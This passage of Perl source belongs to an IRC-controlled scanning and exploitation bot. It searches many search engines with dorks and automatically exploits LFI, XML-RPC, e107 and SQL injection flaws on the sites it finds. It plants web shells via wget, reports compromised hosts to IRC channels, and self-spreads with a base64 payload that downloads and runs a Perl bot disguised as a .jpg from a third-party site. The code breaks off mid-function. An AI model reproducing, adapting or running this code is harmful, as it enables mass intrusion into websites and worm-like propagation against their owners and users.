"http://".$site.$bug."7".$lfidir."/tmp/x-bhl%00";            my $html  = get_content($lfixpl);            if ($html =~ /DOCUMENT_ROOT=\// && $html =~ /HTTP_USER_AGENT=/) {                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {                    my $code = 'echo "BHLb0t#".php_uname()."#BHLb0t"; if(@copy("'.$injector.'","/tmp/x-bhl")) { echo "SUCCESS"; }';                    my $res = lfi_env_query($lfixpl,encode_base64($code));                    $res =~ s/\n//g;                    if ($res =~ /BHLb0t#(.*)#BHLb0tSUCCESS/sg) {                        my $sys = $1;                        &msg("$chan","$lfilogo($engine)(LFI-SHell)4 ".$lfishell." 14".$sys." ");                        &msg("Rocks","(LFI-SHell)4 ".$lfishell." 14".$sys." ");                        &msg("underhack","(LFI-SHell)4 ".$lfishell." 14".$sys." ");                        sleep(4);                        &lfi_spread_query($lfisprd);                    }                    elsif ($res =~ /BHLb0t#(.*)#BHLb0t/sg) {                        if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {                            my $sys = $1;                            my $upload = 'system("wget '.$injector.' -O /tmp/x-bhl");';                            my $wget = lfi_env_query($lfixpl,encode_base64($upload)); sleep(1);                            my $check = get_content("http://".$site.$bug.$lfidir."/tmp/x-bhl%00"); sleep(1);                            if ($check =~ /BHLTeam/) {                                &msg("$chan","$lfilogo($engine)(LFI-SHeLL)4 ".$lfishell." 14".$sys." ");                                &msg("Rocks","(LFI-SHell)4 ".$lfishell." 14".$sys." ");                                &msg("underhack","(LFI-SHell)4 ".$lfishell." 14".$sys." ");                                sleep(4);                                &lfi_spread_query($lfisprd);                            }                            else {                                &msg("$chan","$lfilogo($engine)(SysTem)4 http://".$site.$bug."7[LFI] 14".$sys." ");                                sleep(4);                            }                        } exit; }sleep(5);                    }                    else { &msg("$chan","$lfilogo($engine)(EnviRon) ".$lfivuln." "); }                } exit; } sleep(3);            }        }    }}sub xml() {    my $chan = $_[0];    my $bug = $_[1];    my $dork = $_[2];    my $engine = $_[3];    my $count = 0;    my @list = &search_engine($chan,$bug,$dork,$engine,$xmllogo);    my $num = scalar(@list);    if ($num > 0) {        foreach my $site (@list) {            $count++;            if ($count == $num-1) { &msg("$chan","$xmllogo($engine) Scan finish for14 $dork"); }            my $xmlxpl = "http://".$site.$bug;            my $html = get_content($xmlxpl);            if ( $strona =~ /faultCode/ ) {		xmlcek($xmlxpl);		xmlvuln($xmlxpl);		xmlxspread($xmlxpl,$xmlspread);                &msg("$chan","$xmllogo($engine)(XML-SHeLL)4 ".$xmlshell." 14".$os." ");            }        }    }}sub lfd() {    my $chan = $_[0];    my $bug = $_[1];    my $dork = $_[2];    my $engine = $_[3];    my $count = 0;    my @list = &search_engine($chan,$bug,$dork,$engine,$lfdlogo);    my $num = scalar(@list);    if ($num > 0) {        foreach my $site (@list) {            $count++;            if ($count == $num-1) { &msg("$chan","$lfdlogo($engine) Scan finish for14 $dork"); }            my $lfdxpl = "http://".$site.$bug.$lfdtest;            my $lfdvuln = "http://".$site.$bug."7".$lfdtest;            my $html = get_content($lfdxpl);            if ($html =~ /$lfdoutput/) {                &msg("$chan","$lfdlogo($engine)(LFD-Vuln)4 ".$lfdvuln." ");                sleep(2);            }        }    }}sub sql() {    my $chan = $_[0];    my $bug = $_[1];    my $dork = $_[2];    my $engine = $_[3];    my $count = 0;    my @list = search_engine($chan,$bug,$dork,$engine,$sqllogo);    my $num = scalar(@list);    if ($num > 0) {        foreach my $site (@list) {            $count++;            if ($count == $num-1) { &msg("$chan","$sqllogo($engine) Scan finish for14 $dork"); }            my $sqlxpl = "http://".$site.$bug."'";            my $sqlvuln = "http://".$site.$bug."7[SQL]";            my $sqlsite = "http://".$site.$bug;            my $html = get_content($sqlxpl);            if ( $html =~ m/You have an error in your SQL syntax/i || $html =~ m/Query failed/i || $html =~ m/SQL query failed/i ) {                       &msg("$chan","$sqllogo($engine)(MySQL)4 $sqlvuln ");                       &sqlbrute($sqlsite);            }elsif                ( $html =~ m/ODBC SQL Server Driver/i || $html =~ m/Unclosed quotation mark/i || $html =~ m/Microsoft OLE DB Provider for/i ) {                       &msg("$chan","$sqllogo($engine)(MsSQL)4 $sqlvuln ");            }elsif                ( $html =~ m/Microsoft JET Database/i || $html =~ m/ODBC Microsoft Access Driver/i ) {                       &msg("$chan","$sqllogo($engine)(MsAccess)4 $sqlvuln ");            }        }    }}sub e107() {    my $chan = $_[0];    my $bug = $_[1];    my $dork = $_[2];    my $engine = $_[3];    my $count = 0;    my @list = &search_engine($chan,$bug,$dork,$engine,$e107logo);    my $num = scalar(@list);    if ($num > 0) {        foreach my $site (@list) {            $count++;            if ($count == $num-1) { &msg("$chan","$e107logo($engine) Scan finish for14 $dork"); }            my $e107xpl = "http://".$site.$bug;            my $code = "ZWNobyAiQkhMVGVhbTxicj4iOwplY2hvICJzeXM6Ii5waHBfdW5hbWUoKS4iPGJyPiI7CiRjbWQ9ImVjaG8gQmFsaXNvdXJjZSI7CiRlc2VndWljbWQ9ZXgoJGNtZCk7CmVjaG8gJGVzZWd1aWNtZDsKZnVuY3Rpb24gZXgoJGNmZSl7CiRyZXMgPSAnJzsKaWYgKCFlbXB0eSgkY2ZlKSl7CmlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKXsKQGV4ZWMoJGNmZSwkcmVzKTsKJHJlcyA9IGpvaW4oIlxuIiwkcmVzKTsKfQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpewokcmVzID0gQHNoZWxsX2V4ZWMoJGNmZSk7Cn0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpewpAb2Jfc3RhcnQoKTsKQHN5c3RlbSgkY2ZlKTsKJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKQG9iX2VuZF9jbGVhbigpOwp9CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpewpAb2Jfc3RhcnQoKTsKQHBhc3N0aHJ1KCRjZmUpOwokcmVzID0gQG9iX2dldF9jb250ZW50cygpOwpAb2JfZW5kX2NsZWFuKCk7Cn0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsKJHJlcyA9ICIiOwp3aGlsZSghQGZlb2YoJGYpKSB7ICRyZXMgLj0gQGZyZWFkKCRmLDEwMjQpOyB9CkBwY2xvc2UoJGYpOwp9fQpyZXR1cm4gJHJlczsKfQ==";            my $html = e107_rce_query($e107xpl,$code);            if ($html =~ /BHLTeam<br>sys:(.+?)<br>Balisource/) {                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {                    my $sys = $1;                    my $upload = 'if(@copy("'.$injector.'","sysinfo.php")) { echo "BHLSUKSESBHL"; }';                    my $res = e107_rce_query($e107xpl,encode_base64($upload));                    if ($res =~ /BHLSUKSESBHL/) {                        &msg("$chan","$e107logo($engine)(e107-SheLL)4 http://".$site."7sysinfo.php 14".$sys." (safemode-off)");			&msg("Rocks","(e107-SheLL)4 http://".$site."7sysinfo.php 14".$sys." (safemode-off)");			&msg("underhack","(e107-SheLL)4 http://".$site."7sysinfo.php 14".$sys." (safemode-off)");                        sleep(2);                    }                    else {                        &msg("$chan","$e107logo($engine)(e107-Vuln) ".$e107xpl." 14".$sys." (safemode-off)");                        sleep(2);                    }                    &e107_spread_query($e107xpl);                    sleep(2);                } exit; } sleep(2);            }            elsif ($html =~ /BHLTeam<br>sys:(.+?)<br>/) {                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {                    my $sys = $1;                    my $upload = 'if(@copy("'.$injector.'","sysinfo.php")) { echo "BHLSUKSESBHL"; }';                    my $res = e107_rce_query($e107xpl,encode_base64($upload));                    if ($res =~ /BHLSUKSESBHL/) {                        &msg("$chan","$e107logo($engine)(e107-SheLL)2 http://".$site."7sysinfo.php 14".$sys." (safemode-on)");                        &msg("Rocks","(e107-SheLL)2 http://".$site."7sysinfo.php 14".$sys." (safemode-on)");                        &msg("underhack","(e107-SheLL)2 http://".$site."7sysinfo.php 14".$sys." (safemode-on)");                        sleep(2);                    }                    else {                        &msg("$chan","$e107logo($engine)(e107-Vuln)10 ".$e107xpl." 14".$sys." (safemode-on)");                        sleep(2);                    }                } exit; } sleep(2);            }        }    }}########################################sub search_engine() {    my (@total,@clean);    my $chan = $_[0];    my $bug = $_[1];    my $dork = $_[2];    my $engine = $_[3];    my $logo = $_[4];    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }    if ($engine eq "ReDiff") { my @rediff = &rediff($dork); push(@total,@rediff); }    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }    if ($engine eq "ALtaViSTa") { my @altavista = &altavista($dork); push(@total,@altavista); }    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }    if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }    if ($engine eq "CluSty") { my @clusty = &clusty($dork); push(@total,@clusty); }    if ($engine eq "GutSer") { my @gutser = &gutser($dork); push(@total,@gutser); }    if ($engine eq "GooGle2") { my @google2 = &google2($dork); push(@total,@google2); }    if ($engine eq "ExaLead") { my @exalead = &exalead($dork); push(@total,@exalead); }    if ($engine eq "LyCos") { my @lycos = &lycos($dork); push(@total,@lycos); }    if ($engine eq "VirgiLio") { my @virgilio = &virgilio($dork); push(@total,@virgilio); }    if ($engine eq "WebDe") { my @webde = &webde($dork); push(@total,@webde); }    if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }    if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }    if ($engine eq "SaPo") { my @sapo = &sapo($dork); push(@total,@sapo); }    if ($engine eq "DuCk") { my @duck = &duck($dork); push(@total,@duck); }    if ($engine eq "LyGo") { my @lygo = &lygo($dork); push(@total,@lygo); }    if ($engine eq "YauSe") { my @yause = &yause($dork); push(@total,@yause); }    if ($engine eq "BaiDu") { my @baidu = &baidu($dork); push(@total,@baidu); }    if ($engine eq "KiPoT") { my @kipot = &kipot($dork); push(@total,@kipot); }    if ($engine eq "GiBLa") { my @gibla = &gibla($dork); push(@total,@gibla); }    if ($engine eq "BLacK") { my @black = &black($dork); push(@total,@black); }    @clean = clean(@total);    &msg("$chan","$logo($engine) Total:14 (".scalar(@total).") Clean:14 (".scalar(@clean).")");    return @clean;}#########################################sub cmdlfi() {my $browser = LWP::UserAgent->new;my $url = $_[0];my $cmd = $_[1];my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";$browser->agent("$hie");$browser->timeout(3);$response = $browser->get( $url );if ($response->content =~ /j13mbut(.*)j13mbut/s) {print $1;&msg("$chan","(LFICMD)2 $1");} else {&msg("$chan","(LFICMD)4 No Output");}}sub cmdxml() {my $jed = $_[0];my $dwa = $_[1];my $userAgent = LWP::UserAgent->new(agent => 'perl post');        $exploit = "<?xml version=\"1.0\"?><methodCall>";        $exploit .= "<methodName>test.method</methodName>";        $exploit .= "<params><param><value><name>',''));";        $exploit .= "echo'bamby';echo`".$dwa."`;echo'solo';exit;/*</name></value></param></params></methodCall>";my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);if ($response->content =~ /bamby(.*)solo/s) {print $1;&msg("$chan","(XMLCMD)2 $1");} else {&msg("$chan","(XMLCMD)4 No Output");}}sub cmde107() {my $url  = $_[0];my $code = $_[1];my $chan  = $_[2];my $codecmd = encode_base64($code);my $cmd = 'echo(base64_decode("QkhMVGVhbQ==").shell_exec(base64_decode("aWQ=")).base64_decode("QmFsaXNvdXJjZQ==")).shell_exec(base64_decode("'.$codecmd.'"));';    my $req = HTTP::Request->new(POST => $path);    $req->content_type('application/x-www-form-urlencoded');    $req->content("send-contactus=1&author_name=[php]".$cmd.";die;[/php]");    my $ua = LWP::UserAgent->new(agent => $uagent);    $ua->timeout(10);    my $res = $ua->request($req);my $data = $res->as_string;if ( $data =~ /BHLTeam(.*)Balisource/ ){     $mydata = $1;&msg("$chan","(e107CMD)2 $mydata");}else { &msg("$chan","(e107CMD)4 No Output"); }}#########################################sub os() {    my $url = $_[0];    my $chk  = get_content($url);    if ( $chk =~ m/<br>uname -a:(.+?)\<br>/g ) {        $un = $1;    }    if ( $chk =~ m/<br>os:(.+?)\<br>/g ) {        $os = $1;    }}sub rce_os() {    my $sys = "";    my $url = $_[0];    my $chk = get_content($url);    $chk =~ s/\n//;    if ($chk =~ /999(.*)666/sg) { $sys = $1; }    return $sys;}sub isFound() {    my $status = 0;    my $link = $_[0];    my $reqexp = $_[1];    my $res = get_content($link);    if ($res =~ /$reqexp/) { $status = 1 }    return $status;}sub get_content() {    my $url = $_[0];    my $ua = LWP::UserAgent->new(agent => $uagent);    $ua->timeout(10);    my $req = HTTP::Request->new(GET => $url);    my $res = $ua->request($req);    return $res->content;}sub lfi_env_query() {    my $url = $_[0];    my $code = $_[1];    my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".$code."'));?>");    $ua->timeout(10);    my $req = HTTP::Request->new(GET => $url);    my $res = $ua->request($req);    return $res->content;}sub lfi_spread_query() {    my $url = $_[0];    my $code = $_[1];    my $agent = "<?php echo \"BHLb0t#\"; passthru(\'".$code."\'); echo \"#BHLb0t\"; ?>";    my $ua = LWP::UserAgent->new(agent => $agent);    $ua->timeout(15);    my $req = HTTP::Request->new(GET => $url);    my $response = $ua->request($req);    return $response->content;}sub xmlcek {my $xmltgt = $_[0];my $userAgent = LWP::UserAgent->new(agent => 'perl post');        $exploit = "<?xml version=\"1.0\"?><methodCall>";        $exploit .= "<methodName>test.method</methodName>";        $exploit .= "<params><param><value><name>',''));";        $exploit .= "echo'j13mb0t';echo`uname -a`;echo'j13mb0t';exit;/*</name></value></param></params></methodCall>";my $response = $userAgent->request(POST $xmltgt, Content_Type => 'text/xml', Content => $exploit);if ($response->content =~ /j13mb0t(.*)j13mb0t/s) {$os=$1;}}sub xmlvuln {my $xmltargt = $_[0];my $userAgent = LWP::UserAgent->new(agent => 'perl post');        $exploit = "<?xml version=\"1.0\"?><methodCall>";        $exploit .= "<methodName>test.method</methodName>";        $exploit .= "<params><param><value><name>',''));";        $exploit .= "echo 'J1mb0'.'T';exit;/*</name></value></param></params></methodCall>";my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);if ($response->content =~ /J1mb0T/) {$shellx=$xmltargt;}}sub xmlxspread() {my $xmltargt = $_[0];my $xmlsprd = $_[1];my $userAgent = LWP::UserAgent->new(agent => 'perl post');        $exploit = "<?xml version=\"1.0\"?><methodCall>";        $exploit .= "<methodName>test.method</methodName>";        $exploit .= "<params><param><value><name>',''));";        $exploit .= "echo'j13m';echo`".$xmlsprd."`;echo'b0T';exit;/*</name></value></param></params></methodCall>";my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);}sub e107_rce_query() {    my $url = $_[0];    my $code = $_[1];    my $req = HTTP::Request->new(POST => $url);    $req->content_type('application/x-www-form-urlencoded');    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'));die;[/php]");    my $ua = LWP::UserAgent->new(agent => $uagent);    $ua->timeout(10);    my $res = $ua->request($req);    return $res->content;}sub e107_spread_query() {    my $url = $_[0];    my $code = "JGNtZD0iY2QgL3RtcDt3Z2V0IGh0dHA6Ly93d3cubmFib25nb3R0Yy5hYy5rZS9pbWFnZXMvYmFubmVycy9jdnMuanBnO3BlcmwgY3ZzLmpwZztybSAtcmYgY3ZzLmpwZyI7CiRlc2VndWljbWQ9ZXgoJGNtZCk7CmVjaG8gJGVzZWd1aWNtZDsKZnVuY3Rpb24gZXgoJGNmZSl7CiRyZXMgPSAnJzsKaWYgKCFlbXB0eSgkY2ZlKSl7CmlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKXsKQGV4ZWMoJGNmZSwkcmVzKTsKJHJlcyA9IGpvaW4oIlxuIiwkcmVzKTsKfQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpewokcmVzID0gQHNoZWxsX2V4ZWMoJGNmZSk7Cn0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpewpAb2Jfc3RhcnQoKTsKQHN5c3RlbSgkY2ZlKTsKJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKQG9iX2VuZF9jbGVhbigpOwp9CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpewpAb2Jfc3RhcnQoKTsKQHBhc3N0aHJ1KCRjZmUpOwokcmVzID0gQG9iX2dldF9jb250ZW50cygpOwpAb2JfZW5kX2NsZWFuKCk7Cn0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsKJHJlcyA9ICIiOwp3aGlsZSghQGZlb2YoJGYpKSB7ICRyZXMgLj0gQGZyZWFkKCRmLDEwMjQpOyB9CkBwY2xvc2UoJGYpOwp9fQpyZXR1cm4gJHJlczsKfQ==";    my $req = HTTP::Request->new(POST => $url);    $req->content_type('application/x-www-form-urlencoded');    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'));die;[/php]");    my $ua = LWP::UserAgent->new(agent => $uagent);    $ua->timeout(10);    my $res = $ua->request($req);}######################################### SEARCH ENGINE yahoo hotbot lycos lygo blacksub google() {    my @list;    my $key = $_[0];    for (my $i=0; $i<=5000; $i+=10){        my $search = ("http://www.google.com/search?q=".&key($key)."&num=100&filter=0&start=".$i);        my $res = &search_engine_query($search);        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {            my $link = $1;            if ($link !~ /google/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub rediff() {    my @list;    my $key = $_[0];    for (my $i=0; $i<=3000; $i+=10) {        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".&key($key)."&iss=&submit=Search&firstres=".$i);        my $res = &search_engine_query($search);        while ($res =~ m/<a href=\"http:\/\/(.*?)\" onmousedown/g) {            my $link = $1;            if ($link !~ /search1|rediff/){				my @grep = &links($link);				push(@list,@grep);			}        }    }    return @list;}sub uol() {    my @list;    my $key = $_[0];    for (my $i=1; $i<=3000; $i+=10) {        my $search = ("http://mundo.busca.uol.com.br/buscar.html?q=".&key($key)."&start=".$i);        my $res = &search_engine_query($search);        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {            my $link = $1;            if ($link !~ /busca|uol|yahoo/) {                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub bing() {    my @list;    my $key = $_[0];    for (my $i=1; $i<=3000; $i+=10) {        my $search = ("http://www.bing.com/search?q=".&key($key)."&filt=all&first=".$i."&FORM=PERE");        my $res = &search_engine_query($search);        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {            my $link = $1;            if ($link !~ /msn|live|bing/) {                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub altavista() {    my @list;    my $key = $_[0];    for (my $i=1; $i<=3000; $i+=10){        my $search = ("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".&key($key)."&stq=".$i);        my $res = &search_engine_query($search);        while ($res =~ m/<span class=ngrn>(.+?)\//g) {            my $link = $1;            if ($link !~ /altavista/){                $link =~ s/<//g;                $link =~ s/ //g;                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub ask() {    my @list;    my $key = $_[0];    for (my $i=0; $i<=3000; $i+=10) {        my $search = ("http://it.ask.com/web?q=".&key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$i);        my $res = &search_engine_query($search);        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {            my $link = $1;            if ($link !~ /ask\.com/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub yahoo(){    my @list;	my $key = $_[0];    my $b   = 0;	for ($b=1; $b<=2000; $b+=10) {        my $search = ("http://www.search.yahoo.com/search?p=".&key($key)."&fr2=sb-top&fr=yfp-t-713&b=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/\/\/(.*?)\"/g) {            my $link = $1;            if ($link!~ /search|yahoo/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub clusty() {    my @list;	my $key = $_[0];    my $b   = 0;	for ($b=10; $b<=3000; $b+=10) {        my $search = ("http://search.yippy.com/search?query=".&key($key)."&input-form=clusty-simple&v:sources=webplus&v:state=root|root-".$b."-10|0&");        my $res = &search_engine_query($search);        while ($res =~ m/<div class=\"document-header\"><a href=\"http:\/\/(.*?)\"><span class=\"title\">/g) {            my $link = $1;            if ($link!~ /yippy|clusty/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub gutser() {    my @list;    my $key = $_[0];    my $b   = 0;    for ($b=1; $b<=500; $b+=1) {        my $search = ("http://www.goodsearch.com/Search.aspx?Keywords=".&key($key)."&page=".$b."&osmax=0");        my $res = &search_engine_query($search);        while ($res =~ m/\">(.*?)<\/a><\/div><\/li><li>/g) {            my $link = $1;            if ($link!~ /goodsearch/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub google2() {  my @list;  my $key = $_[0];  my $b	  = 0;  my @doms = (    "com","ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",    "ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",    "com.tr","com.tw","com.ua","co.uk","hu","co.id","com.my");foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];    for ($b=1; $b<=3000; $b+=10) {        my $search = ("http://www.google.".$dom."/search?num=50&q=".&key($key)."&start=".$b."&sa=N");        my $res = &search_engine_query($search);        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {            my $link = $1;            if ($link!~ /google|search/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}}sub exalead() {  my @list;  my $key = $_[0];    for ($b=0; $b<=4000; $b+=100) {        my $search = ("http://www.exalead.com/search/web/results/?q=".&key($key)."&elements_per_page=100&start_index=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/<a class=\"thumbnail\" href=\"http:\/\/(.*?)\"/g) {            my $link = $1;            if ($link!~ /exalead/){                my @grep = &links($link);                push(@list,@grep);            }            }        }    return @list;	}	sub lycos() { #mati#  my @list;  my $key = $_[0];    for ($b=1; $b<=300; $b+=1) {        my $search = ("http://search.lycos.com/?query=".&key($key)."&page2=".$b."&tab=web&searchArea=web");        my $res = &search_engine_query($search);        while ($res =~ m/href=\"http:\/\/([^>\"]*)\"/g) {            my $link = $1;            if ($link!~ /search|lycos/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;	}	sub virgilio() {  my @list;  my $key = $_[0];    for ($b=10; $b<=3000; $b+=10) {        my $search = ("http://ricerca.virgilio.it/ricerca?qs=".&key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/<h3><a href=\"http:\/\/(.*?)\"/g) {            my $link = $1;            if ($link!~ /virgilio/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;	}	sub webde() {  my @list;  my $key = $_[0];    for ($b=0; $b<=300; $b+=1) {        my $search = ("http://suche.web.de/search/web/?pageIndex=".$b."&su=".$key);        my $res = &search_engine_query($search);        while ($res =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g) {            my $link = $1;            if ($link!~ /suche|web/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;	}	sub hotbot() { #mati#  my @list;  my $key = $_[0];    for ($b=0; $b<=300; $b+=1) {        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {            my $link = $1;            if ($link!~ /hotbot|msn/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;	}	sub aol() {  my @list;  my $key = $_[0];    for ($b=2; $b<=300; $b+=1) {        my $search = ("http://aim.search.aol.com/aol/search?q=".&key($key)."&page=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/href=\"http:\/\/(.*?)\" property/g) {            my $link = $1;            if ($link!~ /aol\.com/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;	}sub sapo(){    my @list;	my $key = $_[0];    my $b   = 0;	for ($b=1; $b<=500; $b+=1) {        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".&key($key)."&st=local");        my $res = &search_engine_query($search);        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {            my $link = $1;            if ($link!~ /sapo/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub duck() {	my @list;	my $key = $_[0];    my $b   = 0;	for ($b=1; $b<=500; $b+=1) {        my $search = ("http://duckduckgo.com/html/?q=".&key($key)."&t=A&l=en&p=1&s=".$b."&o=json&dc=".$b."&api=d.js");        my $res = &search_engine_query($search);        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {            my $link = $1;            if ($link!~ /duck/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub lygo() { #mati#	my @list;	my $key = $_[0];    my $b   = 0;	for ($b=1; $b<=500; $b+=1) {        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=lygo&page2=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {            my $link = $1;            if ($link!~ /hotbot|lygo/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub yause() {	my @list;	my $key = $_[0];    my $b   = 0;	for ($b=1; $b<=500; $b+=1) {        my $search = ("http://www.yauba.com/?query=".&key($key)."&where=websites&target=websites&con=y&ilang=english&clt=topic&pg=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/<h1><a rel=\"nofollow\" href=\"http:\/\/(.*?)\" onfocus=/g) {            my $link = $1;            if ($link!~ /yauba|websites/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub baidu() {	my @list;	my $key = $_[0];    my $b   = 0;	for ($b=0; $b<=3000; $b+=10) {        my $search = ("http://www.baidu.com/s?wd=".&key($key)."&pn=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/\" href=\"http:\/\/(.*?)\"  target=/g) {            my $link = $1;            if ($link!~ /baidu/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub kipot() {	my @list;	my $key = $_[0];    my $b   = 0;	for ($b=1; $b<=300; $b+=1) {        my $search = ("http://www.qkport.com/".$b."/web/".&key($key));        my $res = &search_engine_query($search);        while ($res =~ m/href=\"http:\/\/(.*?)\" target=\"_top\"/g) {            my $link = $1;            if ($link!~ /qkport/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub gibla() {	my @list;	my $key = $_[0];    my $b   = 0;	for ($b=0; $b<=3000; $b+=10) {        my $search = ("http://www.gigablast.com/search?s=".$b."&q=".&key($key));        my $res = &search_engine_query($search);        while ($res =~ m/href=http:\/\/(.*?)><font size=/g) {            my $link = $1;            if ($link!~ /gigablast/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}sub black() { #mati#	my @list;	my $key = $_[0];    my $b   = 0;	for ($b=0; $b<=300; $b+=1) {        my $search = ("http://blekko.com/ws/".&key($key)."?ft=&p=".$b);        my $res = &search_engine_query($search);        while ($res =~ m/href=\"=http:\/\/(.*?)\"/g) {            my $link = $1;            if ($link!~ /blekko/){                my @grep = &links($link);                push(@list,@grep);            }        }    }    return @list;}#########################################sub clean() {    my @cln = ();    my %visit = ();    foreach my $element (@_) {        $element =~ s/\/+/\//g;        next if $visit{$element}++;        push @cln, $element;    }    return @cln;}sub key() {    my $dork = $_[0];    $dork =~ s/ /\+/g;    $dork =~ s/:/\%3A/g;    $dork =~ s/\//\%2F/g;    $dork =~ s/\?/\%3F/g;    $dork =~ s/&/\%26/g;    $dork =~ s/\"/\%22/g;    $dork =~ s/,/\%2C/g;    $dork =~ s/\\/\%5C/g;	$dork =~ s/@/\%40/g;	$dork =~ s/\[/\%5B/g;	$dork =~ s/\]/\%5D/g;	$dork =~ s/\?/\%3F/g;	$dork =~ s/\=/\%3D/g;	$dork =~ s/\|/\%7C/g;    return $dork;}sub links() {    my @list;    my $link = $_[0];    my $host = $_[0];    my $hdir = $_[0];    $hdir =~ s/(.*)\/[^\/]*$/$1/;    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;    $host .= "/";    $link .= "/";    $hdir .= "/";    $host =~ s/\/\//\//g;    $hdir =~ s/\/\//\//g;    $link =~ s/\/\//\//g;    push(@list,$link,$host,$hdir);    return @list;}sub search_engine_query() {    my $url = $_[0];    $url =~ s/http:\/\///;    my $host = $url;    my $query = $url;    my $page  = "";    $host =~ s/href=\"?http:\/\///;    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;    $query =~ s/$host//;    if ($query eq "") { $query = "/"; }        eval {            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";            my @pages = <$sock>;            $page = "@pages";            close($sock);        };    return $page;}sub sqlbrute() {my $site=$_[0];my $columns=20;my $cfin.="--";my $cmn.= "+";for ($column = 0 ; $column < $columns ; $column ++)	{	$union.=','.$column;	$inyection.=','."0x6c6f67696e70776e7a";    if ($column == 0)       {